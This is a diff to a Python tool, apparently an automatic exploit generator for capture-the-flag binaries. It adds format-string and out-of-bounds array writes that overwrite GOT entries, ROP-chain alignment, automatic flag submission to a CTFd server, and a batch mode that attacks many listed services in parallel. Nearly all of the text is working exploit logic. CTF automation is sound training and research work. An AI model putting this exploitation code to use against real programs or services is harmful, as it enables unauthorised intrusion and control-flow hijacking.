@@ -6,7 +6,9 @@ import json
 import requests
 import ctypes
 
+
 from pwn import *
+from multiprocessing import *
 from rage.rage import rAEG
 from rage.machine import Machine
 from rage.against import Against
@@ -45,7 +47,7 @@ class Aegis:
         self.padding = None
         self.failed = False
         self.has_format = False
-        self.array_write = None
+        self.array_write = (None, None)
         self.got_targets = None
 
     def static_analysis(self):
@@ -62,7 +64,7 @@ class Aegis:
 
 
     def symbolic_analysis(self):
-        if self.array_write == (None, None):
+        if self.array_write == (None, None) or self.array_write == None:
             self.symbol.stack_smash()
             self.symbolic_padding = self.symbol.symbolic_padding
         
@@ -102,7 +104,11 @@ class Aegis:
                         self.against.format_write(1337, self.elf.sym["pwnme"])
                         self.exploit()
                     else:
-                        got_addr = self.elf.got[self.got_targets[-1]]
+                        if self.got_targets != None:
+                            got_addr = self.elf.got[self.got_targets[-1]]
+                        else:
+                            got_addr = self.elf.got["fflush"]
+
                         if function == "win":
                             self.against.format_write(self.elf.sym["win"], got_addr)
                             self.exploit()
@@ -119,23 +125,26 @@ class Aegis:
                         self.send_flag(self.against.remote_flag)
                     self.remote_signal()
             else:
-                got_addr = self.elf.got[self.got_targets[-1]]
+                if self.got_targets != None:
+                    got_addr = self.elf.got[self.got_targets[-1]]
+                else:
+                    got_addr = self.elf.got["printf"]
                 if self.array_write != (None, None):
+                    print(self.array_write, got_addr)
                     index = (got_addr - self.array_write[0]) // self.array_write[1]
                     rem = (got_addr - self.array_write[0]) % self.array_write[1] 
 
                     start_addr = self.array_write[0] + index * self.array_write[1]
                     end_addr = start_addr + self.array_write[1]
 
-                    aegis_log.debug(f"Writing to {hex(got_addr)} with index {index} and {rem}")
-                    aegis_log.debug(f"Start of write {hex(start_addr)}, End of write {hex(end_addr)}")
+                    aegis_log.debug(f"Writing to {hex(got_addr)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
 
                     system_plt = self.elf.plt["system"] + 0x6
                     system_got = self.elf.got["system"]
                     addr = start_addr
                     edit = b"" 
                     size = self.array_write[1]
-                    while size > 0:
+                    while rem > 0:
                         if rem == 0:
                             check = self.elf.sym["win"] & 0xff
                             if check == 0xa:
@@ -147,7 +156,12 @@ class Aegis:
                         else:
                             edit += b"A" * 8
                         rem -= 8
-                        size -= 8
+
+                    check = self.elf.sym["win"] & 0xff
+                    if check == 0xa:
+                        edit += p64(self.elf.sym["win"]+1)
+                    else:
+                        edit += p64(self.elf.sym["win"])
 
                     self.against.array_exploit = [index, edit]
                     self.exploit()
@@ -212,25 +226,10 @@ class Aegis:
         data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
         response = requests.post(challenge_url, headers=self.headers, data=data)
         json_data = response.json()
-        message = json_data["data"]["message"]
+        #message = json_data["data"]["message"]
 
-        aegis_log.critical(f"Response from remote server {message} for {flag}")
+        aegis_log.critical(f"Response from remote server {json_data} for {flag}")
 
-
-
-    def remote_wait(self):
-        sem = os.getenv("SEM")
-        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
-        while int(sem) <= 0:
-            sleep(1)
-        os.environ["SEM"] = str(int(sem) - 1)
-        #print(f"Semaphore Wait Value {os.getenv('SEM')}")
-            
-    def remote_signal(self):
-        sem = os.getenv("SEM")
-        #print(f"Semaphore Signal Value {os.getenv('SEM')}")
-        os.environ["SEM"] = str(int(sem) + 1)
-        #print(f"Semaphore Signal Value {os.getenv('SEM')}")
 
     def exploit(self):
         """Create and run exploit using Against module."""
@@ -252,7 +251,6 @@ class Aegis:
             aegis_log.debug(f"Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
             chain_len = len(self.against.chain)
-            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
             self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
 
             self.against.process = self.against.start(option)
@@ -344,6 +342,13 @@ def print_title():
     #print(aegis_title)
     #print(pillar)
 
+def exploit_binary(binary, libc, ip, port, ctfd, id):
+    aeg = Aegis(binary, libc, ip, port, ctfd, None, id)
+    aeg.symbolic_analysis()
+    aeg.setup_exploit()
+
+
+
 if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
     #logging.getLogger("angr").setLevel(logging.DEBUG)
@@ -365,15 +370,22 @@ if __name__ == "__main__":
     parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
     parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)
     parser.add_argument("-id", metavar="challengeid", type=str, help="The ctfd challenge id", default=None)
+    parser.add_argument("-batch", action='store_true', help="Run in batch mode", default=None)
 
-    # Set argument for limited logging for multiple binaries
-    if args.BATCH:
-        logging.getLogger("aegis_log").setLevel(logging.CRITICAL)
 
     arguments = parser.parse_args()
     print_title()
 
-    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, None, arguments.id)
-    aeg.static_analysis()
-    aeg.symbolic_analysis()
-    aeg.setup_exploit()
+    if arguments.batch:
+        challenges = open("challenges.csv", "r").readlines()
+        for chal in challenges:
+            chal = chal.split(" ")
+            service = chal[0]
+            bin = chal[1]
+            id = chal[2]
+
+            proc = Process(target=exploit_binary, args=(bin,"./libc/libc.so.6",service,None,"https://ace.ctfd.io",id ))            
+            proc.start()
+
+    else:
+        exploit_binary(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, arguments.id)
